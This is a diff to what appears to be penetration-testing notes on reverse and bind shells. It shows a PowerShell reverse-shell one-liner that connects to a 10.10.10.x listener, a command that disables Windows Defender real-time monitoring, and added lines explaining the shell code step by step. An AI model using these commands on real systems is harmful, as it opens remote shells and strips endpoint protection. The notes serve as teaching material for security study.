@@ -31,7 +31,10 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 > Sometimes we might be able to disable Windows defender Virus & Threat protection, allowing us to run the above:
 > `Set-MpPreference -DisableRealtimeMonitoring $true`
 
-> 1. `powershell -nop -c` creates a no profile (nop) 
+> 1. `powershell -nop -c` creates a no profile (`nop`) and executes the following code (`-c`)
+> 2. First we connect to a TCP socket and set it as the client
+> 3. Now open the stream with `GetStream`
+> 4. Create an empty byte stream to send to our TCP listening waiting
 
 ## Bind Shells
 Unlike a reverse shell, a Bind shell connects us to the *targets'* listening port. This means we are connecting to the target rather than them connecting to us (the opposite direction to a RS).
